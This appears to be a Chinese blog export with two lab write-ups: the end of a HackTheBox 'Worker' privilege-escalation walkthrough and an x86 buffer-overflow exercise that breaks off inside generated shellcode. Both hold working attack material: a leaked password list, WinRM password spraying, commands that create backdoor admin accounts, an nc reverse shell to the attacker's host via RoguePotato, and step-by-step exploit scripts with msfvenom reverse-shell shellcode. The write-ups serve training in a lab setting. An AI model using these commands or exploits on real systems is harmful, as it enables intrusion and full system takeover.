<p><img src="/images/worker/15.png" alt="15"></p>
<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>进入Users目录寻找user的flag，看到robisl，应该要先提权到用户权限</p>
<p><img src="/images/worker/16.png" alt="16"></p>
<h2 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h2><p>之前显示了有一个部署的磁盘W</p>
<p><img src="/images/worker/18.png" alt="18"></p>
<p>在W盘的svn目录找到了凭据</p>
<p><img src="/images/worker/19.png" alt="19"></p>
<h3 id="user"><a href="#user" class="headerlink" title="user"></a>user</h3><p>凭据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">### This file is an example password file for svnserve.                                                                                                 </span><br><span class="line">### Its format is similar to that of svnserve.conf. As shown in the                                                                                     </span><br><span class="line">### example below it contains one section labelled [users].                                                                                             </span><br><span class="line">### The name and password for each user follow, one account per line.                                                                                   </span><br><span class="line">                                                                                                                                                        </span><br><span class="line">[users]                                                                                                                                                 </span><br><span class="line">nathen &#x3D; wendel98                                                                                                                                       </span><br><span class="line">nichin &#x3D; fqerfqerf</span><br><span class="line">nichin &#x3D; asifhiefh</span><br><span class="line">noahip &#x3D; player</span><br><span class="line">nuahip &#x3D; wkjdnw</span><br><span class="line">oakhol &#x3D; bxwdjhcue</span><br><span class="line">owehol &#x3D; supersecret</span><br><span class="line">paihol &#x3D; painfulcode</span><br><span class="line">parhol &#x3D; gitcommit</span><br><span class="line">pathop &#x3D; iliketomoveit</span><br><span class="line">pauhor &#x3D; nowayjose</span><br><span class="line">payhos &#x3D; icanjive</span><br><span class="line">perhou &#x3D; elvisisalive</span><br><span class="line">peyhou &#x3D; ineedvacation</span><br><span class="line">phihou &#x3D; pokemon</span><br><span class="line">quehub &#x3D; pickme</span><br><span class="line">quihud &#x3D; kindasecure</span><br><span class="line">rachul &#x3D; guesswho</span><br><span class="line">raehun &#x3D; idontknow</span><br><span class="line">ramhun &#x3D; thisis</span><br><span class="line">ranhut &#x3D; getting</span><br><span class="line">rebhyd &#x3D; rediculous</span><br><span class="line">reeinc &#x3D; iagree</span><br><span class="line">reeing &#x3D; tosomepoint</span><br><span class="line">reiing &#x3D; isthisenough</span><br><span class="line">renipr &#x3D; dummy</span><br><span class="line">rhiire &#x3D; users</span><br><span class="line">riairv &#x3D; canyou</span><br><span class="line">ricisa &#x3D; seewhich</span><br><span class="line">robish &#x3D; onesare</span><br><span class="line">robisl &#x3D; wolves11</span><br><span class="line">robive &#x3D; andwhich</span><br><span class="line">ronkay &#x3D; onesare</span><br><span class="line">rubkei &#x3D; the</span><br><span class="line">rupkel &#x3D; sheeps</span><br><span class="line">ryakel &#x3D; imtired</span><br><span class="line">sabken &#x3D; drjones</span><br><span class="line">samken &#x3D; aqua</span><br><span class="line">sapket &#x3D; hamburger</span><br><span class="line">sarkil &#x3D; friday</span><br></pre></td></tr></table></figure>

<p>提取账户和密码，通过crackmapexec对winrm进行爆破</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">crackmapexec winrm 10.10.10.203 -u users -p passwords --no-bruteforce --continue-on-success </span><br></pre></td></tr></table></figure>

<p><img src="/images/worker/20.png" alt="20"></p>
<p>得到凭据<code>robisl/wolves11</code></p>
<p>之后就能获得evil-winrm连过去即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">evil-winrm -i 10.10.10.203 -u robisl -p wolves11</span><br></pre></td></tr></table></figure>

<p><img src="/images/worker/21.png" alt="21"></p>
<h3 id="root"><a href="#root" class="headerlink" title="root"></a>root</h3><p>使用robisl登录azure，发现了新的项目</p>
<p><img src="/images/worker/22.png" alt="22"></p>
<p>仔细枚举可以发现，robisl是Build Administrator组的成员</p>
<p><img src="/images/worker/23.png" alt="23"></p>
<p><img src="/images/worker/24.png" alt="24"></p>
<p>在代理池里可以发现username为主机名，表示部署任务都会以SYSTEM权限运行</p>
<p><img src="/images/worker/25.png" alt="25"></p>
<p>现在去创建自己的部署任务即可，添加powershell</p>
<p><img src="/images/worker/26.png" alt="26"></p>
<p>执行的命令为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net user hack p@ssw0rd123 &#x2F;add;net localgroup administrators hack &#x2F;add;net localgroup administrators robisl &#x2F;add;net user administrator p@ssw0rd123</span><br></pre></td></tr></table></figure>

<p><img src="/images/worker/27.png" alt="27"></p>
<p>最后随便连个Administrator组的用户过去即可</p>
<p><img src="/images/worker/28.png" alt="28"></p>
<h2 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h2><p>考虑到当前用户是个service account，具有<code>SeImpersonatePrivilege</code></p>
<p><img src="/images/worker/17.png" alt="17"></p>
<p>应该可以用roguepotato一把梭，但是有一个可预期的问题是，对方存在防火墙，导致RPC连接无法连接目标的OxidResolver</p>
<p><img src="/images/worker/29.png" alt="29"></p>
<p>通过反向隧道可以解决这个问题，这里需要两个shell</p>
<p>先建立隧道，这里使用chisel</p>
<p>攻击者监听端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;chisel server --reverse --port 4000</span><br></pre></td></tr></table></figure>

<p>受害者建立反向隧道，让攻击者的9999端口流量转发到本地的9999端口，即OxidResolver监听端口</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\chisel64 client 10.10.16.2:4000 R:9999:127.0.0.1:9999</span><br></pre></td></tr></table></figure>

<p>同时攻击者将自己135端口流量转发到自己的9999端口，这是Roguepotato的局限性</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socat tcp-listen:135,reuseaddr,fork tcp:127.0.0.1:9999</span><br></pre></td></tr></table></figure>

<p>之后一把梭</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\roguepotato.exe -r 10.10.16.2 -e &quot;C:\Users\Public\Documents\nc64.exe -nv 10.10.16.2 1337 -e cmd&quot; -l 9999</span><br></pre></td></tr></table></figure>

<p><img src="/images/worker/30.png" alt="30"></p>
]]></content>
      <categories>
        <category>HackTheBox</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>x86缓冲区溢出练习题</title>
    <url>/2020/07/11/x86%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E7%BB%83%E4%B9%A0%E9%A2%98/</url>
    <content><![CDATA[<h1 id="x86缓冲区溢出"><a href="#x86缓冲区溢出" class="headerlink" title="x86缓冲区溢出"></a>x86缓冲区溢出</h1><p>做一个简单的x86缓冲区溢出的练习题，该练习题涉及到某些敏感信息会脱敏处理<br>练习题会多编写几个脚本，方便巩固基础，但会对可省略脚本进行标注，以便快速解出题目</p>
<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p>攻击机器 Kali 5.3.0  <code>IP 192.168.1.3</code></p>
<p>目标机器 Windows10 1703(OS Build 15063,483) <code>IP 192.168.1.245</code></p>
<h2 id="测试流程"><a href="#测试流程" class="headerlink" title="测试流程"></a>测试流程</h2><p>首先在windows上开启漏洞软件，利用<code>tasklist</code>找到PID，再根据PID找开放端口</p>
<p><img src="/images/x86BOF/1.jpg" alt="1"></p>
<p>发现漏洞开放了4455端口，kali使用nc连接</p>
<p>连接之后输入HELP，查看可以使用的指令</p>
<p><img src="/images/x86BOF/2.jpg" alt="2"></p>
<p>发现了3个可用指令，这里可以直接生成上千个A，手动对每个命令进行尝试<br>经测试，OVRFLW命令存在漏洞</p>
<h3 id="1-确认连接"><a href="#1-确认连接" class="headerlink" title="1 确认连接"></a>1 确认连接</h3><p>先编写连接脚本，后面的脚本可以在此基础上进行修改</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    print(<span class="string">&#x27;sending buffer...&#x27;</span>)</span><br><span class="line">    s.connect((<span class="string">&#x27;192.168.1.245&#x27;</span>,<span class="number">4455</span>))</span><br><span class="line">    data=s.recv(<span class="number">1024</span>)</span><br><span class="line">    print(data.rstrip())</span><br><span class="line"></span><br><span class="line">    s.send(<span class="string">&#x27;OVRFLW A&#x27;</span>)</span><br><span class="line">    data=s.recv(<span class="number">1024</span>)</span><br><span class="line">    print(data.rstrip())</span><br><span class="line"></span><br><span class="line">    s.close()</span><br><span class="line">    print(<span class="string">&#x27;\nEstablished&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">&quot;Coulnd not connect to server!&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="2-FUZZING"><a href="#2-FUZZING" class="headerlink" title="2 FUZZING"></a>2 FUZZING</h3><p>对OVRFLW指令进行FUZZING</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">buffer=[<span class="string">&#x27;A&#x27;</span>]</span><br><span class="line">counter=<span class="number">100</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(buffer)&lt;=<span class="number">50</span>:</span><br><span class="line">    buffer.append(<span class="string">&quot;A&quot;</span>*counter)</span><br><span class="line">    counter=counter+<span class="number">100</span></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">connect=s.connect((<span class="string">&#x27;192.168.1.245&#x27;</span>,<span class="number">4455</span>))</span><br><span class="line"><span class="keyword">for</span> string <span class="keyword">in</span> buffer:</span><br><span class="line">    print(<span class="string">&quot;Fuzz with &quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(string))+<span class="string">&quot;Bytes&quot;</span>)</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">&#x27;OVRFLW &#x27;</span>+string)</span><br><span class="line">    data=s.recv(<span class="number">1024</span>)</span><br><span class="line">    print(data)</span><br></pre></td></tr></table></figure>

<p>脚本执行到900Bytes时，停止运行</p>
<p><img src="/images/x86BOF/3.jpg" alt="3"></p>
<p>同时EAX、EIP、ESP寄存器都被填满了A</p>
<p><img src="/images/x86BOF/4.jpg" alt="4"></p>
<h3 id="3-确认缓冲区-可省略"><a href="#3-确认缓冲区-可省略" class="headerlink" title="3 确认缓冲区(可省略)"></a>3 确认缓冲区(可省略)</h3><p>修改成一个直接发送900Bytes的脚本，观察确认缓冲区溢出的发生</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=<span class="string">&#x27;A&#x27;</span>*<span class="number">900</span></span><br><span class="line"><span class="keyword">try</span>:    </span><br><span class="line">    print(<span class="string">&quot;Fuzz with &quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(buffer))+<span class="string">&quot;Bytes&quot;</span>)</span><br><span class="line">    s.connect((<span class="string">&#x27;192.168.1.245&#x27;</span>,<span class="number">4455</span>))</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">&#x27;OVRFLW &#x27;</span>+buffer)</span><br><span class="line">    print(<span class="string">&#x27;Done!&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">&quot;Could not connect&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="4-确认偏移"><a href="#4-确认偏移" class="headerlink" title="4 确认偏移"></a>4 确认偏移</h3><p>通过唯一字符串法确认偏移</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;tools&#x2F;exploit&#x2F;pattern_create.rb -l 700</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2A</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dimport socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=<span class="string">&#x27;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:    </span><br><span class="line">    print(<span class="string">&quot;Fuzz with &quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(buffer))+<span class="string">&quot;Bytes&quot;</span>)</span><br><span class="line">    s.connect((<span class="string">&#x27;192.168.1.245&#x27;</span>,<span class="number">4455</span>))</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">&#x27;OVRFLW &#x27;</span>+buffer)</span><br><span class="line">    print(<span class="string">&#x27;Done!&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">&quot;Could not connect&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>通过调试工具，发现EIP地址为:<code>30624239</code></p>
<p><img src="/images/x86BOF/5.jpg" alt="5"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;tools&#x2F;exploit&#x2F;pattern_offset.rb -q 30624239</span><br><span class="line">[*] Exact match at offset 809</span><br></pre></td></tr></table></figure>

<p>通过ruby脚本，确认偏移为809</p>
<h3 id="5-确认精准控制EIP-可省略"><a href="#5-确认精准控制EIP-可省略" class="headerlink" title="5 确认精准控制EIP(可省略)"></a>5 确认精准控制EIP(可省略)</h3><p>通过该脚本，我们可以确认EIP是否可以被精确控制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import socket</span><br><span class="line"></span><br><span class="line">s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer&#x3D;&#39;A&#39;*809+&quot;B&quot;*4+&quot;C&quot;*(900-809-4)</span><br><span class="line">try:    </span><br><span class="line">    print(&quot;Fuzz with &quot;+str(len(buffer))+&quot;Bytes&quot;)</span><br><span class="line">    s.connect((&#39;192.168.1.245&#39;,4455))</span><br><span class="line">    s.recv(1024)</span><br><span class="line">    s.send(&#39;OVRFLW &#39;+buffer+&#39;\r\n&#39;)</span><br><span class="line">    print(&#39;Done!&#39;)</span><br><span class="line">except:</span><br><span class="line">    print(&quot;Could not connect&quot;)</span><br></pre></td></tr></table></figure>

<p><img src="/images/x86BOF/6.jpg" alt="6"></p>
<h3 id="6-确认ESP大小"><a href="#6-确认ESP大小" class="headerlink" title="6 确认ESP大小"></a>6 确认ESP大小</h3><p>我们希望在ESP内存放reverse_shellcode，一般这种shellcode需要300个字节左右，我们适量增大到400，这样如果能有400Bytes的空间，那肯定是可以存放shellcode的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=<span class="string">&#x27;A&#x27;</span>*<span class="number">809</span>+<span class="string">&quot;B&quot;</span>*<span class="number">4</span>+<span class="string">&quot;C&quot;</span>*<span class="number">400</span></span><br><span class="line"><span class="keyword">try</span>:    </span><br><span class="line">    print(<span class="string">&quot;Fuzz with &quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(buffer))+<span class="string">&quot;Bytes&quot;</span>)</span><br><span class="line">    s.connect((<span class="string">&#x27;192.168.1.245&#x27;</span>,<span class="number">4455</span>))</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">&#x27;OVRFLW &#x27;</span>+buffer+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;Done!&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">&quot;Could not connect&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>右键选中ESP→Follow in Stack<br>找到ESP在栈中开始的地址</p>
<p><img src="/images/x86BOF/7.jpg" alt="7"></p>
<p>和结束的地址</p>
<p><img src="/images/x86BOF/8.jpg" alt="8"></p>
<p>0056F7D0-0056F644=18C<br>18C转换成10进制为396，我们运气很好，ESP是足够存放shellcode的</p>
<h3 id="7-寻找坏字符"><a href="#7-寻找坏字符" class="headerlink" title="7 寻找坏字符"></a>7 寻找坏字符</h3><p>可以先用如下脚本生成所有需要使用到的16进制字符</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">256</span>):</span><br><span class="line">    sys.stdout.write(<span class="string">&quot;\\x&quot;</span>+<span class="string">&#x27;&#123;:02x&#125;&#x27;</span>.<span class="built_in">format</span>(x))</span><br></pre></td></tr></table></figure>

<p>之后写到脚本中，寻找坏字符(注意:这一步需要逐个字符查找，如果最后payload失效，很有可能是坏字符没找齐)<br>最后找完所有坏字符的脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">badchars = (</span><br><span class="line"><span class="string">&quot;\x01\x02\x03\x03\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2d\x2f\x30&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3e\x40&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x91\x92\x93\x93\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&quot;</span>+</span><br><span class="line"><span class="string">&quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&quot;</span>+</span><br><span class="line"><span class="string">&quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xbf&quot;</span>+</span><br><span class="line"><span class="string">&quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&quot;</span>+</span><br><span class="line"><span class="string">&quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&quot;</span>+</span><br><span class="line"><span class="string">&quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&quot;</span>+</span><br><span class="line"><span class="string">&quot;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span>)</span><br><span class="line">buffer=<span class="string">&#x27;A&#x27;</span>*<span class="number">809</span>+<span class="string">&quot;B&quot;</span>*<span class="number">4</span>+badchars</span><br><span class="line"><span class="keyword">try</span>:    </span><br><span class="line">    print(<span class="string">&quot;Fuzz with &quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(buffer))+<span class="string">&quot;Bytes&quot;</span>)</span><br><span class="line">    s.connect((<span class="string">&#x27;192.168.1.245&#x27;</span>,<span class="number">4455</span>))</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">&#x27;OVRFLW &#x27;</span>+buffer+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;Done!&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">&quot;Could not connect&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/images/x86BOF/9.jpg" alt="9"></p>
<p>一共有6个:<code>\x04\x3f\x00\xc0\x2e\x94</code></p>
<h3 id="8-EIP注入JMP-ESP"><a href="#8-EIP注入JMP-ESP" class="headerlink" title="8 EIP注入JMP ESP"></a>8 EIP注入JMP ESP</h3><p>首先转换汇编指令<code>JMP ESP</code>为16进制</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~# &#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;tools&#x2F;exploit&#x2F;nasm_shell.rb </span><br><span class="line">nasm &gt; jmp esp</span><br><span class="line">00000000  FFE4              jmp esp</span><br></pre></td></tr></table></figure>

<p>得到FFE4</p>
<p>通过<code>mona</code>开始寻找指令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">!mona modules</span><br></pre></td></tr></table></figure>

<p><img src="/images/x86BOF/10.jpg" alt="10"></p>
<p>运气很好，找到没有各种保护机制的dll，虽然不是OS Dll，但不影响练习拿shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">!mona find -s &quot;\xff\xe4&quot; -m xx.dll</span><br></pre></td></tr></table></figure>

<p><img src="/images/x86BOF/11.jpg" alt="11"></p>
<p>成功找到了指令<code>JMP ESP</code>，地址为0x65626683<br>直接双击这条指令就可以跳到该内存地址，我们给这条<code>JMP ESP</code>指令打上断点</p>
<p><img src="/images/x86BOF/12.jpg" alt="12"></p>
<p>修改我们的py脚本为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">buffer=<span class="string">&#x27;A&#x27;</span>*<span class="number">809</span>+<span class="string">&quot;\x83\x66\x62\x65&quot;</span>+<span class="string">&quot;C&quot;</span>*<span class="number">396</span></span><br><span class="line"><span class="keyword">try</span>:    </span><br><span class="line">    print(<span class="string">&quot;Fuzz with &quot;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(buffer))+<span class="string">&quot;Bytes&quot;</span>)</span><br><span class="line">    s.connect((<span class="string">&#x27;192.168.1.245&#x27;</span>,<span class="number">4455</span>))</span><br><span class="line">    s.recv(<span class="number">1024</span>)</span><br><span class="line">    s.send(<span class="string">&#x27;OVRFLW &#x27;</span>+buffer+<span class="string">&#x27;\r\n&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;Done!&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    print(<span class="string">&quot;Could not connect&quot;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="/images/x86BOF/13.jpg" alt="13"></p>
<p>可以通过EIP地址和程序断点地址发现，我们的JMP ESP指令注入成功</p>
<h3 id="9-生成shellcode-PWN！"><a href="#9-生成shellcode-PWN！" class="headerlink" title="9 生成shellcode PWN！"></a>9 生成shellcode PWN！</h3><p>生成shellcode</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows&#x2F;shell&#x2F;reverse_tcp LHOST&#x3D;192.168.1.3 LPORT&#x3D;4444 -f c -b &#39;\x04\x3f\x00\xc0\x2e\x94&#39;</span><br><span class="line">Found 11 compatible encoders</span><br><span class="line">Attempting to encode payload with 1 iterations of x86&#x2F;shikata_ga_nai</span><br><span class="line">x86&#x2F;shikata_ga_nai succeeded with size 368 (iteration&#x3D;0)</span><br><span class="line">x86&#x2F;shikata_ga_nai chosen with final size 368</span><br><span class="line">Payload size: 368 bytes</span><br><span class="line">Final size of c file: 1571 bytes</span><br><span class="line">unsigned char buf[] &#x3D; </span><br><span class="line">&quot;\xd9\xc7\xbb\xfb\x85\x9a\xed\xd9\x74\x24\xf4\x5a\x31\xc9\xb1&quot;</span><br><span class="line">&quot;\x56\x83\xea\xfc\x31\x5a\x14\x03\x5a\xef\x67\x6f\x11\xe7\xea&quot;</span><br><span class="line">&quot;\x90\xea\xf7\x8a\x19\x0f\xc6\x8a\x7e\x5b\x78\x3b\xf4\x09\x74&quot;</span><br><span class="line">&quot;\xb0\x58\xba\x0f\xb4\x74\xcd\xb8\x73\xa3\xe0\x39\x2f\x97\x63&quot;</span><br><span class="line">&quot;\xb9\x32\xc4\x43\x80\xfc\x19\x85\xc5\xe1\xd0\xd7\x9e\x6e\x46&quot;</span><br><span class="line">&quot;\xc8\xab\x3b\x5b\x63\xe7\xaa\xdb\x90\xbf\xcd\xca\x06\xb4\x97&quot;</span><br><span class="line">&quot;\xcc\xa9\x19\xac\x44\xb2\x7e\x89\x1f\x49\xb4\x65\x9e\x9b\x85&quot;</span><br><span class="line">&quot;\x86\x0d\xe2\x2a\x75\x4f\x22\x8c\x66\x3a\x5a\xef\x1b\x3d\x99&quot;</span><br><span class="line">&quot;\x92\xc7\xc8\x3a\x34\x83\x6b\xe7\xc5\x40\xed\x6c\xc9\x2d\x79&quot;</span><br><span class="line">&quot;\x2a\xcd\xb0\xae\x40\xe9\x39\x51\x87\x78\x79\x76\x03\x21\xd9&quot;</span><br><span class="line">&quot;\x17\x12\x8f\x8c\x28\x44\x70\x70\x8d\x0e\x9c\x65\xbc\x4c\xc8&quot;</span><br><span 